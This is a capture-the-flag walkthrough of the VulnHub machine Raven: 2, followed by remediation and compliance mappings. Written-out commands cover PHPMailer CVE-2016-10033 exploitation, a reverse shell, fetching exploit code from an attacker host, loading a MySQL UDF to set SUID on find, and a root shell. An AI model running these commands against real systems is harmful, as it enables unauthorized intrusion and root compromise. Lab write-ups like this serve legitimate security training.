# Raven: 2 — The Raven Cries No More

Look at this one guys!! Raven: 2 takes everything Raven 1 taught you and cranks it up. Where the first machine had a simpler escalation path, Raven 2 adds the MySQL UDF exploit — one of the most elegant, obscure, and historically important privilege escalation techniques in Linux pentesting. You find a vulnerable PHPMailer via a publicly exposed vendor directory, exploit CVE-2016-10033 to land a web shell, grab MySQL root credentials from wp-config.php, and then compile a shared library that gives MySQL the ability to execute system commands as root. Wild chain, fr fr.

Shoutout to the Raven creator for making a sequel that actually teaches something new. This is must-do content for anyone who wants to understand database-to-OS privilege escalation.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Raven: 2 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/raven-2,269/ |
| **Techniques** | Web directory enumeration, PHPMailer version disclosure, CVE-2016-10033 RCE, MySQL UDF privilege escalation (EDB-1518), SUID find GTFOBin |
| **CVEs** | CVE-2016-10033 (PHPMailer < 5.2.18 remote code execution via From header injection), CVE-2016-6662 (MySQL UDF root code execution) |
| **APT Groups** | FIN7 (uses CMS and webmail RCE for initial access in retail and hospitality sectors); Sandworm (MySQL exploitation and UDF loading documented in energy sector intrusions) |

---

## Attack Summary

```
nmap → SSH (22), HTTP (80), rpcbind (111)
  → Browse port 80 → Raven Security WordPress site
  → dirb → /vendor/ (directory listing enabled)
  → curl /vendor/PATH → flag1
  → curl /vendor/VERSION → 5.2.6 (PHPMailer)
  → PHPMailer 5.2.6 → CVE-2016-10033 RCE
  → Exploit: craft malformed From header → PHP file write
  → nc -lvnp 443 → curl shell.php → reverse shell as www-data
  → cat /var/www/flag2.txt → flag2
  → ls /var/www/html/wp-content/uploads/2018/11/ → flag3 (image)
  → cat /var/www/html/wp-config.php → DB_USER: root, DB_PASSWORD: R@v3nSecurity
  → mysql -u root -pR@v3nSecurity
  → searchsploit 1518 → MySQL UDF exploit
  → compile 1518.c → create function do_system → chmod u+s /usr/bin/find
  → exit mysql → find /tmp -exec /bin/sh \; → uid=0(root)
  → cat /root/flag4.txt → flag4
```

---

## Methodology

1. Full port scan: SSH (22), HTTP (80), rpcbind (111)
2. Web browsing: identify Raven Security WordPress site
3. Directory enumeration with dirb: find exposed /vendor/ directory
4. PHPMailer version disclosure from /vendor/VERSION
5. CVE-2016-10033 RCE: craft malicious From header to plant PHP shell
6. Reverse shell via planted backdoor
7. Enumerate flags 1, 2, 3
8. Extract MySQL root credentials from wp-config.php
9. MySQL UDF exploit (EDB-1518): compile shared library, load into MySQL
10. Use UDF to set SUID on /usr/bin/find
11. GTFOBin find to root shell
12. Root flag capture

---

## Step 1 — Reconnaissance

```bash
nmap -sV -sC 192.168.1.101
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1
80/tcp  open  http    Apache httpd 2.4.10
111/tcp open  rpcbind
```

Browse to port 80: a "Raven Security" company site running WordPress.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Enumeration: Vendor Directory and PHPMailer Version Disclosure

Run dirb against the web root:

```bash
dirb http://192.168.1.101/
```

```
http://192.168.1.101/vendor/     [directory listing enabled]
```

The `/vendor/` directory is exposed with directory listing. This is where Composer stores PHP package dependencies. Notable files inside:

```bash
curl http://192.168.1.101/vendor/PATH
# Contains: flag1

curl http://192.168.1.101/vendor/VERSION
# Contains: 5.2.6

curl http://192.168.1.101/vendor/PHPMailerAutoload.php
# Confirms: PHPMailer library
```

**PHPMailer 5.2.6 is vulnerable to CVE-2016-10033** — remote code execution via a specially crafted `From` address in the email header. This allows an attacker to write arbitrary PHP files to the web root.

**Real-world note:** Exposing the `/vendor/` directory of Composer-managed PHP projects is a critical misconfiguration. It reveals the exact versions of every dependency, making CVE identification trivial. This is found in WordPress sites, Laravel applications, and any PHP project where the web root is set to the project root rather than the `/public/` subdirectory. FIN7 has been observed targeting vendor-exposed web applications as part of initial reconnaissance.

**MITRE ATT&CK:** T1592 — Gather Victim Host Information; T1083 — File and Directory Discovery

---

## Step 3 — PHPMailer 5.2.6 RCE (CVE-2016-10033)

CVE-2016-10033 allows RCE via the `From` header in PHPMailer's `sendmail` mode. The vulnerability: insufficient sanitization of the `From` address allows command injection when the address is passed to the shell.

Locate the contact form on the site — typically at `/contact.php` or similar.

Use the public exploit (multiple Python scripts available):

```bash
# Find exploit
searchsploit phpmailer 5.2.6

# Key exploit configuration:
target = "http://192.168.1.101/contact.php"
backdoor = "shell.php"
lhost = "192.168.1.106"  # Attacker IP

# The exploit sends a crafted POST request to the contact form
# The malformed From address injects a file-write PHP payload
# Result: shell.php is written to the web root
```

Start a listener:

```bash
nc -lvnp 443
```

Run the exploit. When the backdoor is confirmed written, trigger it:

```bash
curl http://192.168.1.101/shell.php
```

Reverse shell callback received as `www-data`. Upgrade to PTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**Real-world note:** CVE-2016-10033 (and its twin CVE-2016-10045) affected millions of WordPress sites that used PHPMailer's contact form implementation. The vulnerability was silently fixed in PHPMailer 5.2.18 with no public announcement, meaning many deployments remained vulnerable for months or years after the patch. Versions below 5.2.18 should be considered completely insecure.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Unix Shell

---

## Step 4 — Flag Collection and MySQL Credentials

Enumerate the filesystem for flags and credentials:

```bash
# Flag 2
ls /var/www/
cat /var/www/flag2.txt

# Flag 3 (stored as an image in WordPress uploads)
ls /var/www/html/wp-content/uploads/2018/11/
# One of these files is flag3.png — view it in a browser

# MySQL credentials from wp-config.php
cat /var/www/html/wp-config.php | grep -E "DB_USER|DB_PASSWORD|DB_NAME"
```

```
define('DB_USER', 'root');
define('DB_PASSWORD', 'R@v3nSecurity');
define('DB_NAME', 'wordpress');
```

MySQL is running as the OS `root` user with `root` database credentials — a critical double misconfiguration.

**Real-world note:** WordPress installations frequently use database credentials stored in plaintext in `wp-config.php`. When MySQL runs as the OS root user (or with root-equivalent privileges), a database compromise translates directly into OS compromise. This is documented in multiple CISA advisories regarding WordPress deployments in critical infrastructure.

**MITRE ATT&CK:** T1552.001 — Credentials in Files

---

## Step 5 — MySQL UDF Privilege Escalation (EDB-1518)

Connect to MySQL with the root credentials:

```bash
mysql -u root -pR@v3nSecurity
```

Download the UDF exploit (Exploit-DB 1518) on the attacker machine:

```bash
searchsploit -m 1518
# 1518.c is now in current directory
python3 -m http.server 8000
```

On the target machine, compile the shared library:

```bash
cd /tmp
wget http://192.168.1.106:8000/1518.c
gcc -g -c 1518.c
gcc -g -shared -Wl,-soname,1518.so.1 -o 1518.so 1518.o -lc
```

In MySQL, load the UDF:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/1518.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
create function do_system returns integer soname '1518.so';
```

Use the UDF to set the SUID bit on `/usr/bin/find`:

```sql
select do_system('chmod u+s /usr/bin/find');
```

Exit MySQL and verify:

```bash
exit
ls -la /usr/bin/find
# -rwsr-xr-x ... /usr/bin/find
```

**What is a UDF?** A User Defined Function in MySQL is a compiled shared library (.so) that MySQL loads and executes. When MySQL runs as root, the UDF executes as root. EDB-1518 defines a `do_system()` function that calls `system()` from libc — arbitrary OS command execution as root from inside the database.

**Real-world note:** This technique was documented in 2006 (EDB-1518) and is still relevant today because MySQL and MariaDB installations with root database privileges and writable plugin directories appear regularly. Sandworm used MySQL UDF-style techniques in several industrial control system intrusions to pivot from web application access to OS root.

**MITRE ATT&CK:** T1543 — Create or Modify System Process; T1548.001 — Abuse Elevation Control: Setuid

---

## Step 6 — GTFOBin: find SUID to Root Shell

The `find` binary now has the SUID bit set. Use the GTFOBins `find` technique:

```bash
find /tmp -exec "/bin/sh" \; -quit
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

(☞ﾟヮﾟ)☞ Root. All 4 flags captured.

```bash
cat /root/flag4.txt
```

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control: Setuid

---

## All Flags Summary

| Flag | Location | How Found |
|---|---|---|
| flag1 | /vendor/PATH (web accessible) | dirb + directory listing |
| flag2 | /var/www/flag2.txt | Shell enumeration |
| flag3 | /var/www/html/wp-content/uploads/2018/11/ (image) | Shell enumeration |
| flag4 | /root/flag4.txt | Root shell post UDF exploit |

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Flag 1 | (in vendor/PATH) | /vendor/PATH directory | Captured via web browse |
| MySQL Credential | root:R@v3nSecurity | /var/www/html/wp-config.php | MySQL root login |
| Flag 2 | (plaintext) | /var/www/flag2.txt | Captured via shell |
| Flag 3 | (image file) | WordPress uploads directory | Viewed in browser |
| Root Shell | uid=0(root) | MySQL UDF + SUID find | Captured via GTFOBin |
| Flag 4 | (plaintext) | /root/flag4.txt | Captured via root shell |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | /vendor/ directory exposed with directory listing | Reveals exact version of every PHP dependency; trivial CVE identification | Set web root to /public/; disable directory listing; block /vendor/ in web server config |
| 2 | PHPMailer 5.2.6 (CVE-2016-10033): From header injection RCE | Affected millions of WordPress contact forms globally; silently patched | Upgrade PHPMailer to 5.2.18+; validate all email input server-side |
| 3 | MySQL running as root with root DB credentials in wp-config.php | Database compromise equals OS compromise when MySQL is root | Run MySQL as dedicated low-privilege user; use least-privilege DB account for WordPress |
| 4 | MySQL UDF loading enabled with writable plugin directory | UDF loading is a documented path from DB root to OS root since 2006 | Set secure_file_priv; restrict MySQL plugin directory permissions; never run MySQL as root |
| 5 | SUID on /usr/bin/find (set by UDF exploit) | SUID on general-purpose utilities trivially yields root via GTFOBins | Audit SUID binaries regularly; never set SUID on find, cp, mv, or similar utilities |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Gathering | Gather Victim Host Information | T1592 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Privilege Escalation | Privilege Escalation | Create or Modify System Process | T1543 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid | T1548.001 |
| Persistence | Persistence | Server Software Component: Web Shell | T1505.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Block /vendor/ directory in web server config** — `Deny from all` in Apache `.htaccess` or nginx `location /vendor/`; set web root to `/public/`
2. **Upgrade PHPMailer to 5.2.18 or later** — patch CVE-2016-10033 and all related header injection vulnerabilities
3. **Run MySQL as dedicated low-privilege user** — `mysql` system user with no OS privileges; no root DB credentials in application config
4. **Restrict MySQL UDF loading** — set `secure_file_priv = ""`; restrict plugin directory permissions; `plugin_dir` to a non-writable location
5. **Audit SUID binaries** — `find / -perm -u=s -type f 2>/dev/null`; never set SUID on general-purpose utilities
6. **Disable directory listing** — `Options -Indexes` in Apache; add to global config, not just .htaccess

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory PHP dependencies; track vendor directory exposure |
| Protect | Access Control | Block /vendor/ from web access; restrict MySQL to dedicated user |
| Protect | Data Security | No root DB credentials in wp-config.php; use secrets management |
| Detect | Anomalies and Events | Alert on PHPMailer exploitation patterns; monitor MySQL plugin directory |
| Respond | Response Planning | Remove planted webshells; rotate MySQL and OS credentials |
| Recover | Recovery Planning | Upgrade PHPMailer; restrict MySQL; audit SUID binaries |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Block vendor directory; restrict MySQL plugin directory |
| AC-6 | Least Privilege | Dedicated low-privilege MySQL user; no root DB access from apps |
| IA-5 | Authenticator Management | No root credentials in application config files |
| CM-7 | Least Functionality | Disable directory listing; restrict MySQL UDF loading |
| SI-2 | Flaw Remediation | Upgrade PHPMailer to patched version |
| SC-28 | Protection of Information at Rest | Encrypt wp-config.php or use a secrets manager |

### CISA KEV

CVE-2016-10033 (PHPMailer RCE) is catalogued in CISA's Known Exploited Vulnerabilities catalog. All installations of PHPMailer below 5.2.18 should be upgraded or isolated immediately. CISA Alert AA21-116A specifically references CMS exploitation as a primary initial access vector for threat actors targeting critical infrastructure.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage Software | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Identity and Access Management (IAM) | Manage Credentials | MIL3 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (block vendor directory; disable directory listing)
- **D3-OAM** — Operating System Administrative Management (SUID auditing; MySQL privilege restriction)
- **D3-NTA** — Network Traffic Analysis (detect PHPMailer exploitation patterns in web traffic)

---

## Final Thoughts

Raven: 2 is a sequel done right. It builds on Raven 1's foundation and introduces the MySQL UDF technique — one of the most historically significant privilege escalation paths in Linux security. The fact that this technique was documented in 2006 and still works in 2024 environments says everything about how slowly configuration security improves in production.

The chain in this machine: vendor directory disclosure → CVE identification → RCE → wp-config.php → MySQL root → UDF compile → SUID set → GTFOBin → root. Every step has a clear reason. Every fix is straightforward. This is database-to-root, and you should know how to do it.

GG dude, the raven speaks no more. (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧

Thanks guys!! (❍ᴥ❍ʋ)
